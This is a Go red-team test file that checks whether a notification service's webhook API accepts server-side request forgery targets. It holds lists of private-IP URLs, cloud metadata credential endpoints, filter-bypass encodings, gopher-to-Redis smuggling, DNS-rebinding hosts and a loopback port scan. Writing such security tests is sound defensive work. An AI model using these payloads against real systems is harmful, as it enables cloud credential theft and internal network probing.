//go:build redteam

package ssrf

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"testing"
	"time"

	"github.com/filipexyz/notif/tests/redteam/exploits"
)

// TestSSRFPrivateIPs tests SSRF via webhook URLs pointing to private IPs
// NOTIF-002: No validation of webhook URLs
func TestSSRFPrivateIPs(t *testing.T) {
	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	for _, ip := range exploits.PrivateIPs {
		for _, port := range []int{80, 8080} {
			t.Run(fmt.Sprintf("%s:%d", ip, port), func(t *testing.T) {
				webhookURL := fmt.Sprintf("http://%s:%d/callback", ip, port)

				payload := map[string]interface{}{
					"url":    webhookURL,
					"topics": []string{"test.ssrf"},
				}
				body, _ := json.Marshal(payload)

				req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/webhooks", bytes.NewReader(body))
				req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
				req.Header.Set("Content-Type", "application/json")

				client := &http.Client{Timeout: 5 * time.Second}
				resp, err := client.Do(req)
				if err != nil {
					t.Logf("Request failed (may be network issue): %v", err)
					return
				}
				defer resp.Body.Close()

				// If webhook creation succeeds, SSRF is possible
				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					t.Errorf("VULNERABLE: Webhook created with private IP URL: %s", webhookURL)
				} else {
					t.Logf("Blocked (good): %s returned %d", webhookURL, resp.StatusCode)
				}
			})
		}
	}
}

// TestSSRFCloudMetadata tests access to cloud metadata endpoints
func TestSSRFCloudMetadata(t *testing.T) {
	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	metadataURLs := []string{
		// AWS
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/user-data/",

		// GCP
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://169.254.169.254/computeMetadata/v1/",

		// Azure
		"http://169.254.169.254/metadata/instance",

		// Digital Ocean
		"http://169.254.169.254/metadata/v1/",

		// Alibaba
		"http://100.100.100.200/latest/meta-data/",
	}

	for _, metaURL := range metadataURLs {
		t.Run(metaURL, func(t *testing.T) {
			payload := map[string]interface{}{
				"url":    metaURL,
				"topics": []string{"test.ssrf.metadata"},
			}
			body, _ := json.Marshal(payload)

			req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/webhooks", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
			req.Header.Set("Content-Type", "application/json")

			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				t.Errorf("CRITICAL: Webhook created pointing to cloud metadata: %s", metaURL)
			}
		})
	}
}

// TestSSRFURLBypass tests common SSRF URL bypass techniques
func TestSSRFURLBypass(t *testing.T) {
	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	// Various bypass techniques for URL validation
	bypassURLs := []string{
		// IP encoding variations
		"http://0x7f000001/",                    // Hex encoding
		"http://2130706433/",                    // Decimal encoding
		"http://017700000001/",                  // Octal encoding
		"http://127.1/",                         // Shortened
		"http://127.0.0.1.xip.io/",              // DNS rebinding
		"http://[::1]/",                         // IPv6 localhost
		"http://[0:0:0:0:0:ffff:127.0.0.1]/",    // IPv6 mapped IPv4

		// URL parsing tricks
		"http://notif.sh@127.0.0.1/",            // User info
		"http://127.0.0.1#@notif.sh/",           // Fragment
		"http://127.0.0.1?@notif.sh/",           // Query
		"http://notif.sh:80@127.0.0.1/",         // Port in user
		"http://127.0.0.1:80\\@notif.sh/",       // Backslash

		// Protocol smuggling
		"http://127.0.0.1:25/",                  // SMTP
		"http://127.0.0.1:6379/",                // Redis
		"http://127.0.0.1:11211/",               // Memcached
		"gopher://127.0.0.1:6379/_INFO",         // Gopher protocol

		// DNS rebinding setup
		"http://localhost.attacker.com/",
		"http://127-0-0-1.nip.io/",
	}

	for _, bypassURL := range bypassURLs {
		t.Run(bypassURL, func(t *testing.T) {
			payload := map[string]interface{}{
				"url":    bypassURL,
				"topics": []string{"test.ssrf.bypass"},
			}
			body, _ := json.Marshal(payload)

			req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/webhooks", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
			req.Header.Set("Content-Type", "application/json")

			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				t.Errorf("VULNERABLE: Bypass URL accepted: %s", bypassURL)
			}
		})
	}
}

// TestSSRFPortScan demonstrates internal port scanning capability
func TestSSRFPortScan(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping port scan in short mode")
	}

	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	// This test demonstrates the port scanning capability
	// In a real attack, timing differences reveal open ports
	t.Log("Port scanning demonstration - check webhook delivery logs for timing differences")

	for _, port := range exploits.CommonPorts {
		webhookURL := fmt.Sprintf("http://127.0.0.1:%d/", port)

		payload := map[string]interface{}{
			"url":    webhookURL,
			"topics": []string{fmt.Sprintf("portscan.%d", port)},
		}
		body, _ := json.Marshal(payload)

		req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/webhooks", bytes.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{Timeout: 5 * time.Second}
		resp, _ := client.Do(req)
		if resp != nil {
			resp.Body.Close()
			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				t.Logf("Port %d: webhook created (can be used for scanning)", port)
			}
		}
	}
}
